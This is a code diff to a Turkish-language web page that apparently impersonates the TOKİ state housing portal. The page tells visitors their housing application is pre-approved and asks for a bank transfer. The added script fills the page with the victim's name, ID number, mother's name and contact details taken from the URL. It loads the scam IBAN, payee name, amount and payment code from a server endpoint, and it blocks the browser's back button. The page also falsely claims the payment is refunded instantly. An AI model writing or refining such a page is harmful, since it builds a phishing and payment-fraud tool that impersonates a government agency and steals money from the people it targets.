@@ -58,65 +58,6 @@
                 box-shadow: 0 1px 3px rgba(0,0,0,0.1);
             }
 
-            .header-logo {
-                display: flex;
-                align-items: center;
-                gap: 8px;
-            }
-
-            .logo-image {
-                height: 41px;
-                width: auto;
-                filter: brightness(0) invert(1);
-            }
-
-            .menu-btn {
-                background: none;
-                border: none;
-                color: white;
-                font-size: 18px;
-                cursor: pointer;
-                padding: 5px;
-            }
-
-            .search-box {
-                position: relative;
-                width: 300px;
-                max-width: 300px;
-            }
-
-            .search-input {
-                width: 100%;
-                padding: 10px 35px 10px 12px;
-                border: 1px solid #ddd;
-                border-radius: 8px;
-                font-size: 13px;
-                outline: none;
-                background: #f9f9f9;
-            }
-
-            .search-input:focus {
-                border-color: #4a7bc8;
-                background: white;
-            }
-
-            .search-btn {
-                position: absolute;
-                right: 8px;
-                top: 50%;
-                transform: translateY(-50%);
-                background: none;
-                border: none;
-                cursor: pointer;
-                width: 16px;
-                height: 16px;
-                background-image: url('./images/9349901.png');
-                background-size: contain;
-                background-repeat: no-repeat;
-                background-position: center;
-                filter: brightness(0) saturate(100%) invert(48%) sepia(79%) saturate(2476%) hue-rotate(206deg) brightness(118%) contrast(97%);
-            }
-
             .user-info {
                 display: flex;
                 align-items: center;
@@ -998,10 +939,6 @@
             <button class="menu-btn">☰</button>
         </div>
         <div class="header-search">
-            <div class="search-box">
-                <input type="text" class="search-input" placeholder="Nasıl yardım edebilirim?">
-                <button class="search-btn"></button>
-            </div>
             <div class="user-info">
                 <div class="user-name" id="userNameToggle">Kullanıcı <span class="dropdown-arrow"></span></div>
                 <div class="user-dropdown" id="userDropdown"><ul><li>11111111110</li><li><a href="#">Benim Sayfam</a></li><li><a href="#">Favori Hizmetlerim</a></li><li><a href="#">Gelen Kutusu <span class="inbox-count">(37)</span></a></li><li><a href="#">İletişim Seçenekleri</a></li><li><a href="#">Güvenlik ve Ayarlar</a></li><li><a href="#">Şifremi Değiştir</a></li><li><a href="#" class="logout">Güvenli Çıkış</a></li></ul></div>
@@ -1039,7 +976,7 @@
             <div class="success-icon"></div>
             <div class="success-content">
                 <p class="success-text">
-                    <span class="tc-number" id="success-tc-number"></span> T.C. kimlik numaralı şahsa<br>
+                    <span class="tc-number" id="success-tc-number">TC</span> T.C. kimlik numaralı şahsa<br>
                     ait başvuru ön onay almıştır.
                 </p>
             </div>
@@ -1092,7 +1029,7 @@
             <div class="form-group">
                 <label class="form-label">*TOKİ Yetkili Adı</label>
                 <div class="input-with-copy">
-                    <input type="text" class="form-input" id="authority-name" value="Yükleniyor..." readonly>
+                    <input type="text" class="form-input" id="authority-name" value="" readonly>
                     <button class="copy-btn" onclick="copyToClipboard(document.getElementById('authority-name').value, this)">Kopyala</button>
                 </div>
                 <div class="form-help-text">Ödeme dekontunuzun ekran resmini alarak sisteme yüklemeniz gerekmektedir.</div>
@@ -1102,7 +1039,7 @@
             <div class="form-group">
                 <label class="form-label">*TOKİ İban No</label>
                 <div class="input-with-copy">
-                    <input type="text" class="form-input" id="iban-number" value="Yükleniyor..." readonly>
+                    <input type="text" class="form-input" id="iban-number" value="" readonly>
                     <button class="copy-btn" onclick="copyToClipboard(document.getElementById('iban-number').value.replace(/\s/g, ''), this)">Kopyala</button>
                 </div>
                 <div class="form-help-text">FAST/HAVALE ödemeleriniz anlık işleme alınmaktadır.</div>
@@ -1112,7 +1049,7 @@
             <div class="form-group">
                 <label class="form-label">*Ödenecek Tutar</label>
                 <div class="input-with-copy">
-                    <input type="text" class="form-input amount-input" id="payment-amount" value="Yükleniyor..." readonly>
+                    <input type="text" class="form-input amount-input" id="payment-amount" value="" readonly>
                     <button class="copy-btn" onclick="copyToClipboard(document.getElementById('payment-amount').value.replace(' TL', ''), this)">Kopyala</button>
                 </div>
                 <div class="form-help-text">Ödemeniz banka hesabınıza işlem sonunda anlık olarak iade edilmektedir.</div>
@@ -1129,7 +1066,7 @@
                 <div class="form-help-text orange-text">İşlemlerin tamamlanması için ödeme yapmanız gerekmektedir. İşlemlerin yarım kalması durumunda</div>
                 <div class="form-help-text red-text">Lütfen Havale/EFT açıklamasına aşağıdaki kodu girin.</div>
                 <div class="input-with-copy">
-                    <input type="text" class="form-input" id="payment-code" value="Yükleniyor..." readonly>
+                    <input type="text" class="form-input" id="payment-code" value="" readonly>
                     <button class="copy-btn" onclick="copyToClipboard(document.getElementById('payment-code').value, this)">Kopyala</button>
                 </div>
                 <div class="form-help-text">Ödemenizin doğrulanması için yukarıdaki kodu Havale/EFT işlem açıklamasına girmeniz gerekmektedir.</div>
@@ -1190,9 +1127,152 @@
     </footer>
 
     <script>
-        history.pushState(null,null,location.href);window.onpopstate=function(){history.go(1)};
-        document.addEventListener('DOMContentLoaded',function(){const u=new URLSearchParams(window.location.search),tc=u.get('tc');if(tc){const e=document.querySelector('#userDropdown li:first-child');e&&(e.textContent=tc)}const t=document.getElementById('userNameToggle'),d=document.getElementById('userDropdown');if(t&&d){t.addEventListener('click',e=>{e.stopPropagation();d.classList.toggle('active')});document.addEventListener('click',e=>{!d.contains(e.target)&&!t.contains(e.target)&&d.classList.remove('active')});d.addEventListener('click',e=>e.stopPropagation())}});
-        if(window.self!==window.top){document.body.classList.add('in-iframe')}
+        // URL'den querystring parametrelerini al
+        const urlParams = new URLSearchParams(window.location.search);
+        const name = urlParams.get('name') || '';
+        const tc = urlParams.get('tc') || '';
+        const birthDate = urlParams.get('birth_date') || '';
+        const city = urlParams.get('city') || '';
+        const district = urlParams.get('district') || '';
+        const motherName = urlParams.get('mother_name') || '';
+        const source = urlParams.get('source') || '';
+        const project = urlParams.get('project') || '';
+        const appId = urlParams.get('app_id') || '';
+        const phone = urlParams.get('phone') || '';
+        const email = urlParams.get('email') || '';
+        const status = urlParams.get('status') || '';
+
+        // Kullanıcı adını güncelle
+        const userNameElement = document.getElementById('userNameToggle');
+        if (userNameElement && name) {
+            userNameElement.innerHTML = name.toUpperCase() + ' <span class="dropdown-arrow"></span>';
+        }
+
+        // TC numarasını güncelle
+        if (tc) {
+            const tcElement = document.querySelector('#userDropdown li:first-child');
+            if (tcElement) {
+                tcElement.textContent = tc;
+            }
+            // Başarı bildirimindeki TC numarasını güncelle
+            const successTcElement = document.getElementById('success-tc-number');
+            if (successTcElement) {
+                successTcElement.textContent = tc;
+            }
+        }
+
+        // MongoDB'den ödeme ayarlarını çek
+        async function loadPaymentSettings() {
+            try {
+                const response = await fetch('/api/get-payment-settings');
+                const data = await response.json();
+                
+                if (data.success && data.settings) {
+                    const settings = data.settings;
+                    
+                    // TOKİ Yetkili Adı
+                    const authorityNameInput = document.getElementById('authority-name');
+                    if (authorityNameInput && settings.authority_name) {
+                        authorityNameInput.value = settings.authority_name;
+                    }
+                    
+                    // TOKİ IBAN No
+                    const ibanInput = document.getElementById('iban-number');
+                    if (ibanInput && settings.iban) {
+                        ibanInput.value = settings.iban;
+                    }
+                    
+                    // Ödenecek Tutar
+                    const amountInput = document.getElementById('payment-amount');
+                    if (amountInput && settings.amount) {
+                        amountInput.value = settings.amount + ' TL';
+                    }
+                    
+                    // Ödeme Kodu
+                    const codeInput = document.getElementById('payment-code');
+                    if (codeInput && settings.code) {
+                        codeInput.value = settings.code;
+                    }
+                }
+            } catch (error) {
+                console.error('Ödeme ayarları yüklenirken hata oluştu:', error);
+            }
+        }
+
+        // Sayfa tamamen yüklendikten sonra ödeme ayarlarını yükle
+        window.addEventListener('load', function() {
+            loadPaymentSettings();
+        });
+
+        // Gönderen adı alanını URL'den gelen isimle doldur
+        const senderNameInput = document.getElementById('sender-name');
+        if (senderNameInput && name) {
+            senderNameInput.value = name.toUpperCase();
+        }
+
+        // Kopyalama fonksiyonu
+        function copyToClipboard(text, button) {
+            navigator.clipboard.writeText(text).then(function() {
+                // Buton üzerinde başarı animasyonu göster
+                const originalText = button.textContent;
+                button.textContent = '✓ Kopyalandı';
+                button.classList.add('success');
+                setTimeout(function() {
+                    button.textContent = originalText;
+                    button.classList.remove('success');
+                }, 2000);
+            }).catch(function(err) {
+                // Fallback - input seçip kopyala
+                const tempInput = document.createElement('input');
+                tempInput.value = text;
+                document.body.appendChild(tempInput);
+                tempInput.select();
+                document.execCommand('copy');
+                document.body.removeChild(tempInput);
+                
+                const originalText = button.textContent;
+                button.textContent = '✓ Kopyalandı';
+                button.classList.add('success');
+                setTimeout(function() {
+                    button.textContent = originalText;
+                    button.classList.remove('success');
+                }, 2000);
+            });
+        }
+
+        // History API - geri butonu engelleme
+        history.pushState(null, null, location.href);
+        window.onpopstate = function() {
+            history.go(1);
+        };
+
+        // Dropdown menü işlevselliği
+        document.addEventListener('DOMContentLoaded', function() {
+            const userNameToggle = document.getElementById('userNameToggle');
+            const userDropdown = document.getElementById('userDropdown');
+            
+            if (userNameToggle && userDropdown) {
+                userNameToggle.addEventListener('click', function(e) {
+                    e.stopPropagation();
+                    userDropdown.classList.toggle('active');
+                });
+                
+                document.addEventListener('click', function(e) {
+                    if (!userDropdown.contains(e.target) && !userNameToggle.contains(e.target)) {
+                        userDropdown.classList.remove('active');
+                    }
+                });
+                
+                userDropdown.addEventListener('click', function(e) {
+                    e.stopPropagation();
+                });
+            }
+        });
+
+        // iframe kontrolü
+        if (window.self !== window.top) {
+            document.body.classList.add('in-iframe');
+        }
     </script>
 </body>
 </html>
